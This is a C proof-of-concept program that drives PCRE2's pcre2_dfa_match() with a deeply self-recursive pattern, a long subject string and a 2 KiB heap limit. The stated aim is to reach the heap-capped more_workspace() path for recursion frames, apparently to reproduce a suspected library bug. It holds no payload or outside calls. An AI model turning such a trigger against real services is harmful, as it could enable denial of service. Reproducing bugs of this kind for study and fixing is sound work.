/* PoC driving pcre2_dfa_match() through the public API.
   A deeply self-recursive pattern forces internal_dfa_match() to recurse,
   exhausting the base workspace and calling more_workspace() for an
   OP_RECURSE frame (ovector size RWS_OVEC_RSIZE) while a tight heap limit
   is in force. */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(int argc, char **argv)
{
  int errorcode;
  PCRE2_SIZE erroroffset;
  const char *pattern = "^(?P<x>a(?&x)?b)$";
  const char *fixed = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

  const char *subject = fixed;
  if (argc > 1) subject = argv[1];

  pcre2_code *re = pcre2_compile((PCRE2_SPTR)pattern, PCRE2_ZERO_TERMINATED,
    0, &errorcode, &erroroffset, NULL);
  if (re == NULL)
  {
    PCRE2_UCHAR buf[256];
    pcre2_get_error_message(errorcode, buf, sizeof(buf));
    fprintf(stderr, "compile failed at %d: %s\n", (int)erroroffset, buf);
    return 2;
  }

  pcre2_match_context *mctx = pcre2_match_context_create(NULL);
  pcre2_set_heap_limit(mctx, 2);   /* 2 KiB: forces heap-capped more_workspace */

  pcre2_match_data *md = pcre2_match_data_create(64, NULL);

  int ws[4096];
  int rc = pcre2_dfa_match(re, (PCRE2_SPTR)subject, strlen(subject), 0, 0,
    md, mctx, ws, sizeof(ws)/sizeof(ws[0]));

  printf("rc=%d\n", rc);

  pcre2_match_data_free(md);
  pcre2_match_context_free(mctx);
  pcre2_code_free(re);
  return 0;
}
